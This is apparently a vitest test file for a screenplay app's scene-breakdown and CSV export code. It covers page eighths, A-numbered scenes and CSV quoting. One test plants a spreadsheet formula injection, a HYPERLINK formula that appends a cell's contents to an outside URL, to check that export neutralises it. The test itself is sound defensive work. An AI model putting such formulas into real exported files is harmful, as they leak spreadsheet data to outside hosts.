import { readFileSync } from 'node:fs';
import { parse } from '@drafter/fountain';
import { paginate } from '@drafter/layout';
import { builtins, type Template } from '@drafter/templates';
import { describe, expect, it } from 'vitest';
import { BREAKDOWN_COLUMNS, breakdownRows, toCsv } from '../src/breakdown';
import { productionLayout } from '../src/layout';

const screenplay = builtins['us-screenplay'] as Template;
const play = builtins['stage-play-standard'] as Template;
const sample = (name: string) =>
  readFileSync(new URL(`../../../samples/${name}`, import.meta.url), 'utf8');

function rowsOf(text: string, template: Template) {
  const doc = parse(text);
  return breakdownRows(doc, template, paginate(doc, template, { sceneNumbers: 'none' }));
}

const SCRIPT = `Title: Test

INT. KITCHEN - DAY

> A synopsis line.

= Anna meets Bo.

ANNA stands by the sink. BO arrives with CY.

ANNA
Hello.

BO
Hi, there.

EXT. YARD - NIGHT

Wind.

.OMITTED #3#

INT./EXT. CAR - DUSK

CY drives.

CY
Go.
`;

describe('breakdownRows', () => {
  it('one row per scene with every column', () => {
    expect(BREAKDOWN_COLUMNS).toEqual([
      'Scene',
      'INT/EXT',
      'Location',
      'Time',
      'Pages',
      'Page',
      'Cast',
      'Synopsis',
    ]);
    const rows = rowsOf(SCRIPT, screenplay);
    expect(rows).toHaveLength(4);
    for (const row of rows) expect(row).toHaveLength(8);
    expect(rows[0]).toEqual([
      '1',
      'INT',
      'KITCHEN',
      'DAY',
      '2/8',
      '1',
      'ANNA, BO, CY',
      'Anna meets Bo.',
    ]);
    expect(rows[1]?.slice(0, 4)).toEqual(['2', 'EXT', 'YARD', 'NIGHT']);
    expect(rows[3]?.slice(0, 4)).toEqual(['4', 'INT/EXT', 'CAR', 'DUSK']);
    expect(rows[3]?.[6]).toBe('CY');
  });

  it('OMITTED is a row with only its number and OMITTED', () => {
    expect(rowsOf(SCRIPT, screenplay)[2]).toEqual(['3', 'OMITTED', '', '', '', '', '', '']);
  });

  it('says pages in eighths', () => {
    const lines = Array.from({ length: 40 }, (_, i) => `Line ${i}.\n`).join('\n');
    const rows = rowsOf(`INT. A - DAY\n\n${lines}\nINT. B - DAY\n\nShort.\n`, screenplay);
    expect(rows[0]?.[4]).toMatch(/^\d+( \d\/8)?$|^\d\/8$/);
    expect(rows[0]?.[4]).toContain(' ');
    expect(rows[1]?.[4]).toBe('1/8');
  });

  it('a stage play’s ## scenes are its rows, numbered by place', () => {
    const rows = rowsOf(sample('stage-play.fountain'), play);
    expect(rows.length).toBeGreaterThan(0);
    rows.forEach((row, i) => {
      expect(row[0]).toBe(String(i + 1));
      expect(row[1]).toBe('');
    });
  });

  it('shows a locked script’s page labels', async () => {
    const { lock } = await import('../src/actions');
    const changes = await lock(SCRIPT, screenplay, {
      today: '2026-11-09',
      draftId: 'd',
      firstScene: 1,
    });
    let text = SCRIPT;
    for (const c of [...changes].sort((a, b) => b.from - a.from)) {
      text = text.slice(0, c.from) + c.insert + text.slice(c.to);
    }
    const { layout } = await productionLayout(text, screenplay, {
      sceneNumbers: 'none',
      marks: 'none',
    });
    const rows = breakdownRows(parse(text), screenplay, layout);
    expect(rows[0]?.[5]).toBe('1');
  });

  it('calls a locked script’s new scene by its A-number, from the layout’s numbers (ruling F1)', async () => {
    const { lock } = await import('../src/actions');
    const two = 'INT. HALL - DAY\n\nOne.\n\nINT. ATTIC - NIGHT\n\nTwo.\n';
    const changes = await lock(two, screenplay, {
      today: '2026-11-09',
      draftId: 'd',
      firstScene: 5,
    });
    let text = two;
    for (const c of [...changes].sort((a, b) => b.from - a.from)) {
      text = text.slice(0, c.from) + c.insert + text.slice(c.to);
    }
    text = text.replace('INT. ATTIC', 'INT. STAIRS - DAY\n\nNew.\n\nINT. ATTIC');
    const result = await productionLayout(text, screenplay, {
      sceneNumbers: 'none',
      marks: 'none',
    });
    const rows = breakdownRows(parse(text), screenplay, result.layout, result.sceneNumbers);
    expect(rows.map((row) => row[0])).toEqual(['5', '5A', '6']);
    // Without them, as an unlocked script: the ordinal.
    expect(breakdownRows(parse(text), screenplay, result.layout).map((row) => row[0])).toEqual([
      '5',
      '2',
      '6',
    ]);
  });

  it('reads the sample screenplay', () => {
    const rows = rowsOf(sample('screenplay.fountain'), screenplay);
    expect(rows.length).toBeGreaterThan(1);
    expect(rows.every((r) => r[5] !== '' || r[1] === 'OMITTED')).toBe(true);
  });
});

describe('toCsv', () => {
  it('quotes commas, quotes, and line breaks', () => {
    const csv = toCsv([['a', 'b,c', 'say "hi"', 'two\nlines', 'cr\rhere', '']]);
    expect(csv).toBe('a,"b,c","say ""hi""","two\nlines","cr\rhere",\r\n');
  });

  it('ends every line with CRLF and has no byte order mark', () => {
    const csv = toCsv([['x'], ['y']]);
    expect(csv).toBe('x\r\ny\r\n');
    expect(csv.charCodeAt(0)).not.toBe(0xfeff);
  });

  it('keeps formulas out: a leading = + - @ tab or CR gets a quote in front', () => {
    const csv = toCsv([
      ['=SUM(A1)', '+1', '-2', '@WREN', '\tx', '\rx', '=a,b', 'plain', '', 'a=b', '-'],
    ]);
    expect(csv).toBe(`'=SUM(A1),'+1,'-2,'@WREN,'\tx,"'\rx","'=a,b",plain,,a=b,'-\r\n`);
  });

  it('neutralises a planted location, synopsis, and cue in the breakdown', () => {
    const text = 'INT. =HYPERLINK("https://x/?"&B2,"Open") - DAY\n\n> +1 plan\n\n@WREN\nHi.\n';
    const rows = rowsOf(text, screenplay);
    const csv = toCsv([[...BREAKDOWN_COLUMNS], ...rows]);
    expect(csv).toContain(`"'=HYPERLINK(""https://x/?""&B2,""Open"")"`);
    expect(csv).not.toMatch(/(^|,)=/m);
  });
});
